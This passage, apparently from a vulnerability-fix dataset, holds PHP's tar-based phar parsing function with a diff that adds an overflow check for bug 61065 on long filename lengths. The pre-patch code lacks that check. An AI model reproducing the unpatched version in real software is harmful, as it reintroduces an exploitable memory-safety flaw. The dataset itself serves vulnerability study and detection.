estrdup(hdr->linkname);\n\t\t}\n\t\tphar_set_inode(&entry TSRMLS_CC);\n\t\tzend_hash_add(&myphar->manifest, entry.filename, entry.filename_len, (void*)&entry, sizeof(phar_entry_info), (void **) &newentry);\n\n\t\tif (entry.is_persistent) {\n\t\t\t++entry.manifest_pos;\n\t\t}\n\n\t\tif (entry.filename_len >= sizeof(\".phar/.metadata\")-1 && !memcmp(entry.filename, \".phar/.metadata\", sizeof(\".phar/.metadata\")-1)) {\n\t\t\tif (FAILURE == phar_tar_process_metadata(newentry, fp TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has invalid metadata in magic file \\\"%s\\\"\", fname, entry.filename);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tif (!actual_alias && entry.filename_len == sizeof(\".phar/alias.txt\")-1 && !strncmp(entry.filename, \".phar/alias.txt\", sizeof(\".phar/alias.txt\")-1)) {\n\t\t\t/* found explicit alias */\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has alias that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, size);\n\n\t\t\tif (read == size) {\n\t\t\t\tbuf[size] = '\\0';\n\t\t\t\tif (!phar_validate_alias(buf, size)) {\n\t\t\t\t\tif (size > 50) {\n\t\t\t\t\t\tbuf[50] = '.';\n\t\t\t\t\t\tbuf[51] = '.';\n\t\t\t\t\t\tbuf[52] = '.';\n\t\t\t\t\t\tbuf[53] = '\\0';\n\t\t\t\t\t}\n\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: invalid alias \\\"%s\\\" in tar-based phar \\\"%s\\\"\", buf, fname);\n\t\t\t\t\t}\n\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\n\t\t\t\tactual_alias = pestrndup(buf, size, myphar->is_persistent);\n\t\t\t\tmyphar->alias = actual_alias;\n\t\t\t\tmyphar->alias_len = size;\n\t\t\t\tphp_stream_seek(fp, pos, SEEK_SET);\n\t\t\t} else {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to read alias from tar-based phar \\\"%s\\\"\", fname);\n\t\t\t\t}\n\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tsize = (size+511)&~511;\n\n\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\tif (read != sizeof(buf)) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t}\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\t} while (read != 0);\n\n\tif (zend_hash_exists(&(myphar->manifest), \".phar/stub.php\", sizeof(\".phar/stub.php\")-1)) {\n\t\tmyphar->is_data = 0;\n\t} else {\n\t\tmyphar->is_data = 1;\n\t}\n\n\t/* ensure signature set */\n\tif (!myphar->is_data && PHAR_G(require_hash) && !myphar->signature) {\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\tif (error) {\n\t\t\tspprintf(error, 0, \"tar-based phar \\\"%s\\\" does not have a signature\", fname);\n\t\t}\n\t\treturn FAILURE;\n\t}\n\n\tmyphar->fname = pestrndup(fname, fname_len, myphar->is_persistent);\n#ifdef PHP_WIN32\n\tphar_unixify_path_separators(myphar->fname, fname_len);\n#endif\n\tmyphar->fname_len = fname_len;\n\tmyphar->fp = fp;\n\tp = strrchr(myphar->fname, '/');\n\n\tif (p) {\n\t\tmyphar->ext = memchr(p, '.', (myphar->fname + fname_len) - p);\n\t\tif (myphar->ext == p) {\n\t\t\tmyphar->ext = memchr(p + 1, '.', (myphar->fname + fname_len) - p - 1);\n\t\t}\n\t\tif (myphar->ext) {\n\t\t\tmyphar->ext_len = (myphar->fname + fname_len) - myphar->ext;\n\t\t}\n\t}\n\n\tphar_request_initialize(TSRMLS_C);\n\n\tif (SUCCESS != zend_hash_add(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len, (void*)&myphar, sizeof(phar_archive_data*), (void **)&actual)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\" to phar registry\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\treturn FAILURE;\n\t}\n\n\tmyphar = *actual;\n\n\tif (actual_alias) {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tmyphar->is_temporary_alias = 0;\n\n\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void **)&fd_ptr)) {\n\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, actual_alias, myphar->alias_len TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t}\n\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t} else {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tif (alias_len) {\n\t\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void **)&fd_ptr)) {\n\t\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, alias, alias_len TSRMLS_CC)) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\t\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t\t\tmyphar->alias = pestrndup(alias, alias_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = alias_len;\n\t\t} else {\n\t\t\tmyphar->alias = pestrndup(myphar->fname, fname_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = fname_len;\n\t\t}\n\n\t\tmyphar->is_temporary_alias = 1;\n\t}\n\n\tif (pphar) {\n\t\t*pphar = myphar;\n\t}\n\n\treturn SUCCESS;\n}",
        "func": "int phar_parse_tarfile(php_stream* fp, char *fname, int fname_len, char *alias, int alias_len, phar_archive_data** pphar, int is_data, php_uint32 compression, char **error TSRMLS_DC) /* {{{ */\n{\n\tchar buf[512], *actual_alias = NULL, *p;\n\tphar_entry_info entry = {0};\n\tsize_t pos = 0, read, totalsize;\n\ttar_header *hdr;\n\tphp_uint32 sum1, sum2, size, old;\n\tphar_archive_data *myphar, **actual;\n\tint last_was_longlink = 0;\n\n\tif (error) {\n\t\t*error = NULL;\n\t}\n\n\tphp_stream_seek(fp, 0, SEEK_END);\n\ttotalsize = php_stream_tell(fp);\n\tphp_stream_seek(fp, 0, SEEK_SET);\n\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\tif (read != sizeof(buf)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is not a tar file or is truncated\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\treturn FAILURE;\n\t}\n\n\thdr = (tar_header*)buf;\n\told = (memcmp(hdr->magic, \"ustar\", sizeof(\"ustar\")-1) != 0);\n\n\tmyphar = (phar_archive_data *) pecalloc(1, sizeof(phar_archive_data), PHAR_G(persist));\n\tmyphar->is_persistent = PHAR_G(persist);\n\t/* estimate number of entries, can't be certain with tar files */\n\tzend_hash_init(&myphar->manifest, 2 + (totalsize >> 12),\n\t\tzend_get_hash_value, destroy_phar_manifest_entry, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->mounted_dirs, 5,\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->virtual_dirs, 4 + (totalsize >> 11),\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tmyphar->is_tar = 1;\n\t/* remember whether this entire phar was compressed with gz/bzip2 */\n\tmyphar->flags = compression;\n\n\tentry.is_tar = 1;\n\tentry.is_crc_checked = 1;\n\tentry.phar = myphar;\n\tpos += sizeof(buf);\n\n\tdo {\n\t\tphar_entry_info *newentry;\n\n\t\tpos = php_stream_tell(fp);\n\t\thdr = (tar_header*) buf;\n\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\tbreak;\n\t\t}\n\t\tmemset(hdr->checksum, ' ', sizeof(hdr->checksum));\n\t\tsum2 = phar_tar_checksum(buf, old?sizeof(old_tar_header):sizeof(tar_header));\n\n\t\tsize = entry.uncompressed_filesize = entry.compressed_filesize =\n\t\t\tphar_tar_number(hdr->size, sizeof(hdr->size));\n\n\t\tif (((!old && hdr->prefix[0] == 0) || old) && strlen(hdr->name) == sizeof(\".phar/signature.bin\")-1 && !strncmp(hdr->name, \".phar/signature.bin\", sizeof(\".phar/signature.bin\")-1)) {\n\t\t\toff_t curloc;\n\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has signature that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\nbail:\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcurloc = php_stream_tell(fp);\n\t\t\tread = php_stream_read(fp, buf, size);\n\t\t\tif (read != size) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be read\", fname);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n#ifdef WORDS_BIGENDIAN\n# define PHAR_GET_32(buffer) \\\n\t(((((unsigned char*)(buffer))[3]) << 24) \\\n\t\t| ((((unsigned char*)(buffer))[2]) << 16) \\\n\t\t| ((((unsigned char*)(buffer))[1]) <<  8) \\\n\t\t| (((unsigned char*)(buffer))[0]))\n#else\n# define PHAR_GET_32(buffer) (php_uint32) *(buffer)\n#endif\n\t\t\tmyphar->sig_flags = PHAR_GET_32(buf);\n\t\t\tif (FAILURE == phar_verify_signature(fp, php_stream_tell(fp) - size - 512, myphar->sig_flags, buf + 8, size - 8, fname, &myphar->signature, &myphar->sig_len, error TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tchar *save = *error;\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be verified: %s\", fname, save);\n\t\t\t\t\tefree(save);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n\t\t\tphp_stream_seek(fp, curloc + 512, SEEK_SET);\n\t\t\t/* signature checked out, let's ensure this is the last file in the phar */\n\t\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\n\t\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\t\tphp_stream_seek(fp, 512, SEEK_CUR);\n\t\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\thdr = (tar_header*) buf;\n\t\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\n\t\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" has entries after signature, invalid phar\", fname);\n\t\t\t}\n\n\t\t\tgoto bail;\n\t\t}\n\n\t\tif (!last_was_longlink && hdr->typeflag == 'L') {\n\t\t\tlast_was_longlink = 1;\n\t\t\t/* support the ././@LongLink system for storing long filenames */\n\t\t\tentry.filename_len = entry.uncompressed_filesize;\n\n\t\t\t/* Check for overflow - bug 61065 */\n\t\t\tif (entry.filename_len == UINT_MAX) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (invalid entry size)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.filename = pemalloc(entry.filename_len+1, myphar->is_persistent);\n\n\t\t\tread = php_stream_read(fp, entry.filename, entry.filename_len);\n\t\t\tif (read != entry.filename_len) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.filename[entry.filename_len] = '\\0';\n\n\t\t\t/* skip blank stuff */\n\t\t\tsize = ((size+511)&~511) - size;\n\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\t\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcontinue;\n\t\t} else if (!last_was_longlink && !old && hdr->prefix[0] != 0) {\n\t\t\tchar name[256];\n\t\t\tint i, j;\n\n\t\t\tfor (i = 0; i < 155; i++) {\n\t\t\t\tname[i] = hdr->prefix[i];\n\t\t\t\tif (name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tname[i++] = '/';\n\t\t\tfor (j = 0; j < 100; j++) {\n\t\t\t\tname[i+j] = hdr->name[j];\n\t\t\t\tif (name[i+j] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tentry.filename_len = i+j;\n\n\t\t\tif (name[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t\tentry.filename = pestrndup(name, entry.filename_len, myphar->is_persistent);\n\t\t} else if (!last_was_longlink) {\n\t\t\tint i;\n\n\t\t\t/* calculate strlen, which can be no longer than 100 */\n\t\t\tfor (i = 0; i < 100; i++) {\n\t\t\t\tif (hdr->name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tentry.filename_len = i;\n\t\t\tentry.filename = pestrndup(hdr->name, i, myphar->is_persistent);\n\n\t\t\tif (entry.filename[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename[entry.filename_len - 1] = '\\0';\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t}\n\t\tlast_was_longlink = 0;\n\n\t\tphar_add_virtual_dirs(myphar, entry.filename, entry.filename_len TSRMLS_CC);\n\n\t\tif (sum1 != sum2) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (checksum mismatch of file \\\"%s\\\")\", fname, entry.filename);\n\t\t\t}\n\t\t\tpefree(entry.filename, myphar->is_persistent);\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\n\t\tentry.tar_type = ((old & (hdr->typeflag == '\\0')) ? TAR_FILE : hdr->typeflag);\n\t\tentry.offset = entry.offset_abs = pos; /* header_offset unused in tar */\n\t\tentry.fp_type = PHAR_FP;\n\t\tentry.flags = phar_tar_number(hdr->mode, sizeof(hdr->mode)) & PHAR_ENT_PERM_MASK;\n\t\tentry.timestamp = phar_tar_number(hdr->mtime, sizeof(hdr->mtime));\n\t\tentry.is_persistent = myphar->is_persistent;\n#ifndef S_ISDIR\n#define S_ISDIR(mode)\t(((mode)&S_IFMT) == S_IFDIR)\n#endif\n\t\tif (old && entry.tar_type == TAR_FILE && S_ISDIR(entry.flags)) {\n\t\t\tentry.tar_type = TAR_DIR;\n\t\t}\n\n\t\tif (entry.tar_type == TAR_DIR) {\n\t\t\tentry.is_dir = 1;\n\t\t} else {\n\t\t\tentry.is_dir = 0;\n\t\t}\n\n\t\tentry.link = NULL;\n\n\t\tif (entry.tar_type == TAR_LINK) {\n\t\t\tif (!zend_hash_exists(&myphar->manifest, hdr->linkname, strlen(hdr->linkname))) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file - hard link to non-existent file \\\"%s\\\"\", fname, hdr->linkname);\n\t\t\t\t}\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t} else if (entry.tar_type == TAR_SYMLINK) {\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t}\n\t\tphar_set_inode(&entry TSRMLS_CC);\n\t\tzend_hash_add(&myphar->manifest, entry.filename, entry.filename_len, (void*)&entry, sizeof(phar_entry_info), (void **) &newentry);\n\n\t\tif (entry.is_persistent) {\n\t\t\t++entry.manifest_pos;\n\t\t}\n\n\t\tif (entry.filename_len >= sizeof(\".phar/.metadata\")-1 && !memcmp(entry.filename, \".phar/.metadata\", sizeof(\".phar/.metadata\")-1)) {\n\t\t\tif (FAILURE == phar_tar_process_metadata(newentry, fp TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has invalid metadata in magic file \\\"%s\\\"\", fname, entry.filename);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tif (!actual_alias && entry.filename_len == sizeof(\".phar/alias.txt\")-1 && !strncmp(entry.filename, \".phar/alias.txt\", sizeof(\".phar/alias.txt\")-1)) {\n\t\t\t/* found explicit alias */\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has alias that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, size);\n\n\t\t\tif (read == size) {\n\t\t\t\tbuf[size] = '\\0';\n\t\t\t\tif (!phar_validate_alias(buf, size)) {\n\t\t\t\t\tif (size > 50) {\n\t\t\t\t\t\tbuf[50] = '.';\n\t\t\t\t\t\tbuf[51] = '.';\n\t\t\t\t\t\tbuf[52] = '.';\n\t\t\t\t\t\tbuf[53] = '\\0';\n\t\t\t\t\t}\n\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: invalid alias \\\"%s\\\" in tar-based phar \\\"%s\\\"\", buf, fname);\n\t\t\t\t\t}\n\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\n\t\t\t\tactual_alias = pestrndup(buf, size, myphar->is_persistent);\n\t\t\t\tmyphar->alias = actual_alias;\n\t\t\t\tmyphar->alias_len = size;\n\t\t\t\tphp_stream_seek(fp, pos, SEEK_SET);\n\t\t\t} else {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to read alias from tar-based phar \\\"%s\\\"\", fname);\n\t\t\t\t}\n\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tsize = (size+511)&~511;\n\n\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\tif (read != sizeof(buf)) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t}\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\t} while (read != 0);\n\n\tif (zend_hash_exists(&(myphar->manifest), \".phar/stub.php\", sizeof(\".phar/stub.php\")-1)) {\n\t\tmyphar->is_data = 0;\n\t} else {\n\t\tmyphar->is_data = 1;\n\t}\n\n\t/* ensure signature set */\n\tif (!myphar->is_data && PHAR_G(require_hash) && !myphar->signature) {\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\tif (error) {\n\t\t\tspprintf(error, 0, \"tar-based phar \\\"%s\\\" does not have a signature\", fname);\n\t\t}\n\t\treturn FAILURE;\n\t}\n\n\tmyphar->fname = pestrndup(fname, fname_len, myphar->is_persistent);\n#ifdef PHP_WIN32\n\tphar_unixify_path_separators(myphar->fname, fname_len);\n#endif\n\tmyphar->fname_len = fname_len;\n\tmyphar->fp = fp;\n\tp = strrchr(myphar->fname, '/');\n\n\tif (p) {\n\t\tmyphar->ext = memchr(p, '.', (myphar->fname + fname_len) - p);\n\t\tif (myphar->ext == p) {\n\t\t\tmyphar->ext = memchr(p + 1, '.', (myphar->fname + fname_len) - p - 1);\n\t\t}\n\t\tif (myphar->ext) {\n\t\t\tmyphar->ext_len = (myphar->fname + fname_len) - myphar->ext;\n\t\t}\n\t}\n\n\tphar_request_initialize(TSRMLS_C);\n\n\tif (SUCCESS != zend_hash_add(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len, (void*)&myphar, sizeof(phar_archive_data*), (void **)&actual)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\" to phar registry\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\treturn FAILURE;\n\t}\n\n\tmyphar = *actual;\n\n\tif (actual_alias) {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tmyphar->is_temporary_alias = 0;\n\n\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void **)&fd_ptr)) {\n\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, actual_alias, myphar->alias_len TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t}\n\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t} else {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tif (alias_len) {\n\t\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void **)&fd_ptr)) {\n\t\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, alias, alias_len TSRMLS_CC)) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\t\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t\t\tmyphar->alias = pestrndup(alias, alias_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = alias_len;\n\t\t} else {\n\t\t\tmyphar->alias = pestrndup(myphar->fname, fname_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = fname_len;\n\t\t}\n\n\t\tmyphar->is_temporary_alias = 1;\n\t}\n\n\tif (pphar) {\n\t\t*pphar = myphar;\n\t}\n\n\treturn SUCCESS;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -143,6 +143,16 @@\n \t\t\tlast_was_longlink = 1;\n \t\t\t/* support the ././@LongLink system for storing long filenames */\n \t\t\tentry.filename_len = entry.uncompressed_filesize;\n+\n+\t\t\t/* Check for overflow - bug 61065 */\n+\t\t\tif (entry.filename_len == UINT_MAX) {\n+\t\t\t\tif (error) {\n+\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (invalid entry size)\", fname);\n+\t\t\t\t}\n+\t\t\t\tphp_stream_close(fp);\n+\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n+\t\t\t\treturn FAILURE;\n+\t\t\t}\n \t\t\tentry.filename = pemalloc(entry.filename_len+1, myphar->is_persistent);\n \n \t\t\tread = php_stream_read(fp, entry.filename, entry.filename_len);",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "",
                "\t\t\t/* Check for overflow - bug 61065 */",
                "\t\t\tif (entry.filename_len == UINT_MAX) {",
                "\t\t\t\tif (error) {",
